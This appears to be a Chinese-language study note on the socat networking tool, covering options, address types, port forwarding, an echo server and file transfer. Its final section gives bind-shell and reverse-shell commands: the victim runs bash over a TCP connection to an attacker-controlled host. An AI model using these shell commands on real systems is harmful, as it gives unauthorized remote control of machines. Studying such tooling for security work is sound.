@@ -1,0 +1,113 @@
+零 原理：端口转发。
+
+
+
+
+
+
+
+一 socat基本用法：
+（零）格式：socat [options] <source> <destination>
+数据流向是：从source转发到destination。
+
+
+
+（一）选项：
+1 -V：显示版本。
+
+2 -h、-hh、-hhh：显示帮助信息。
+
+3 调试：
+-d
+-d -d
+-d -d -d
+-d -d -d -d
+
+4 
+-u：Uses unidirectional mode. The first address is only used for reading, and the second address is only used for writing (example).
+-U：Uses unidirectional mode in reverse direction. The first address is only used for writing, and the second address is only used for reading.
+
+5 
+-4：IPv4，默认。
+-6：IPv6.
+
+6 -x：出错不中止。
+
+7 -b<size>：单次传输字节数上限。
+
+8 以二进制形式记录流量
+-r <file>
+Dumps the raw (binary) data flowing from left to right address to the given file.
+-R <file>
+Dumps the raw (binary) data flowing from right to left address to the given file.
+
+9 -D：
+用于在开始数据传输之前记录有关文件描述符的信息。
+
+10  -lf<logfile>：将日志写入到logfile中。
+
+
+
+（二）source和destination的类型和格式（囊括了socket的所有东西甚至一些衍生协议和操作）：
+1 IP、SSL、SCTP、SOCKS4、SOCKS4A、TCP、UDP。
+我们主要使用这里，主要使用TCP。
+
+2 FD、STDIO、STDIN、STDOUT、STDERR。
+
+3 SOCKET、INTERFACE、UNIX
+（2）INTERFACE:<interface>
+
+4 PIPE
+
+5 PTY
+
+6 EXEC
+格式：EXEC:<CMD>
+
+7 CREATE：不明白
+
+8 READLINE
+
+
+
+
+
+
+
+二 核心用法（socat == socket开发，这根本不是一下能搞明白的，我们节选对网络安全有用的基本操作即可（TCP、FD、EXEC），这些操作也具有普适性）
+（一）TCP端口转发：socat TCP-LISTEN:<listen-port>,fork,reuseaddr TCP:<remote-addr>:<remote-port>
+附加选项如下：
+1 fork: 每次有新连接时都会创建一个新的进程，允许服务器处理多个并发连接。
+
+2 reuseaddr: 允许快速重用地址，这在服务器重启后非常有用。可以通过 TCP-LISTEN:1234,reuseaddr 来使用。
+
+3 max-children=<number>: 限制同时处理的连接数。例如 max-children=10 限制最多同时处理 10 个连接。
+
+4 crlf: 将接收到的数据行转换为 CRLF（即 \r\n），通常用于文本协议。
+
+5 keepalive: 启用 TCP keepalive 选项，帮助检测死连接。
+
+6 bind=<address>: 指定绑定的本地地址。例如 bind=192.168.1.100 绑定到特定 IP 地址。
+
+7 backlog=<number>: 设置待处理连接队列的最大长度。例如 backlog=10 设定连接队列最大为 10。
+
+
+
+（二）TCP回显服务器：socat TCP-LISTEN:<listen-port>,reuseaddr,fork EXEC:/bin/cat
+
+
+
+（三）文件传输：
+接收端：socat TCP-LISTEN:<listen-port>,reuseaddr,fork FILE:./received_file
+发送端：socat FILE:./send_file TCP:<listen-addr>:<listen-port>
+
+
+
+（四）shell
+1 正向shell
+（1）victim：socat TCP-LISTEN:<listen-port>,reuseaddr,fork EXEC:/bin/bash
+（2）attacker：ncat <victim-addr> <victim-listen-port>
+
+2 反弹shell（这个反弹shell是我见过的最好的！）
+（1）attacker：socat file:`tty`,raw,echo=0 tcp-listen:<listen-port>,bind=<listen-addr>,reuseaddr,fork
+（2）victim：socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<attacker-addr>:<attaker-port>
